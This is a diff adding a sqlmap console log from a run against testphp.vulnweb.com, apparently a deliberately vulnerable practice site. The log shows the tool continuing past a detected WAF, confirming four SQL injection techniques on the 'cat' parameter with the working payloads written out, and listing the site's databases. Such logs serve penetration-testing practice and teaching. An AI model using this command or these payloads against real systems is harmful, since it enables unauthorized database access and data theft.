@@ -1,0 +1,126 @@
+C:\sqlmap>sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.2.11.7#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
+ consent is illegal. It is the end user's responsibility to obey all applicable
+local, state and federal laws. Developers assume no liability and are not respon
+sible for any misuse or damage caused by this program
+
+[*] starting @ 21:46:45 /2018-12-04/
+
+[21:46:46] [INFO] testing connection to the target URL
+[21:46:46] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:47:05] [CRITICAL] heuristics detected that the target is protected by some k
+ind of WAF/IPS
+do you want sqlmap to try to detect backend WAF/IPS? [y/N] y
+[21:47:08] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
+[21:47:08] [INFO] using WAF scripts to detect backend WAF/IPS protection
+[21:47:39] [INFO] heuristics detected web page charset 'ascii'
+[21:47:39] [CRITICAL] WAF/IPS identified as 'Generic (Unknown)'
+are you sure that you want to continue with further target testing? [y/N] y
+[21:47:55] [WARNING] please consider usage of tamper scripts (option '--tamper')
+
+[21:47:55] [INFO] testing if the target URL content is stable
+[21:47:55] [INFO] target URL content is stable
+[21:47:55] [INFO] testing if GET parameter 'cat' is dynamic
+[21:47:55] [INFO] GET parameter 'cat' appears to be dynamic
+[21:47:55] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be
+ injectable (possible DBMS: 'MySQL')
+[21:47:55] [INFO] heuristic (XSS) test shows that GET parameter 'cat' might be v
+ulnerable to cross-site scripting (XSS) attacks
+[21:47:55] [INFO] testing for SQL injection on GET parameter 'cat'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
+ecific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'MySQL' extending
+provided level (1) and risk (1) values? [Y/n] y
+[21:48:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:48:03] [WARNING] reflective value(s) found and filtering out
+[21:48:04] [INFO] GET parameter 'cat' appears to be 'AND boolean-based blind - W
+HERE or HAVING clause' injectable (with --string="sem")
+[21:48:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER B
+Y or GROUP BY clause (BIGINT UNSIGNED)'
+[21:48:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause
+(BIGINT UNSIGNED)'
+[21:48:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER B
+Y or GROUP BY clause (EXP)'
+[21:48:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause
+(EXP)'
+[21:48:04] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER
+ BY or GROUP BY clause (JSON_KEYS)'
+[21:48:04] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING claus
+e (JSON_KEYS)'
+[21:48:05] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER B
+Y or GROUP BY clause (FLOOR)'
+[21:48:05] [INFO] GET parameter 'cat' is 'MySQL >= 5.0 AND error-based - WHERE,
+HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[21:48:05] [INFO] testing 'MySQL inline queries'
+[21:48:05] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[21:48:05] [WARNING] time-based comparison requires larger statistical model, pl
+ease wait..............  (done)
+[21:48:06] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[21:48:07] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment
+)'
+[21:48:07] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
+[21:48:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment
+)'
+[21:48:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[21:48:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[21:48:27] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-ba
+sed blind' injectable
+[21:48:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[21:48:27] [INFO] automatically extending ranges for UNION query injection techn
+ique tests as there is at least one other (potential) technique found
+[21:48:28] [INFO] 'ORDER BY' technique appears to be usable. This should reduce
+the time needed to find the right number of query columns. Automatically extendi
+ng the range for current UNION query injection technique test
+[21:48:28] [INFO] target URL appears to have 11 columns in query
+[21:48:31] [INFO] target URL appears to be UNION injectable with 11 columns
+[21:48:31] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 c
+olumns' injectable
+GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if an
+y)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 71 HTTP(s) re
+quests:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 7997=7997
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY cl
+ause (FLOOR)
+    Payload: cat=1 AND (SELECT 9270 FROM(SELECT COUNT(*),CONCAT(0x716b707071,(SE
+LECT (ELT(9270=9270,1))),0x716b7a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA
+.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cat=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,CONCAT(0x716b707071,0x71494e4459724d456
+24a7a4e7a507758454f545462496d794c5a6a6a4d706c487372735878496552,0x716b7a7071),NU
+LL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FidG
+---
+[21:48:39] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.3.10, Nginx 1.4.1
+back-end DBMS: MySQL >= 5.0
+[21:48:39] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[21:48:39] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+[21:48:39] [INFO] fetched data logged to text files under 'C:\Users\Meat Man\.sq
+lmap\output\testphp.vulnweb.com'
+
+[*] ending @ 21:48:39 /2018-12-04/
